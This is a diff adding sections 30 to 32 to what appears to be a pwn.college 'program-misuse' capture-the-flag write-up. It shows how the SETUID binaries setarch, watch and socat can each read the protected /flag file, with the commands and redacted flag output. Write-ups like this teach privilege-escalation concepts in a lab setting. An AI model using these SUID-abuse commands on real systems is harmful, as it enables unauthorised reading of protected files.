@@ -416,3 +416,30 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 ```
 
 
+## 30. `setarch`
+
+The `setarch` command is used by developers to test and run their applications by emulating a certain architecture. Specifying the architecture is necessary so using `$(uname -m)` fetches the current architecture name of the OS and since `setarch` has SETUID binary set we can use it to read the contents of the flag.
+
+```bash
+hacker@program-misuse~setarch:/challenge$ setarch $(uname -m) -- cat /flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 31. `watch`
+
+`watch` command used to execute a command at certain intervals of time repeatedly in output fullscreen. The `-x` switch can be used to pass a command we want to run.
+
+```
+watch -x cat /flag
+```
+
+
+## 32. `socat`
+
+```bash
+hacker@program-misuse~socat:/challenge$ socat EXEC:'cat /flag' STDIO
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
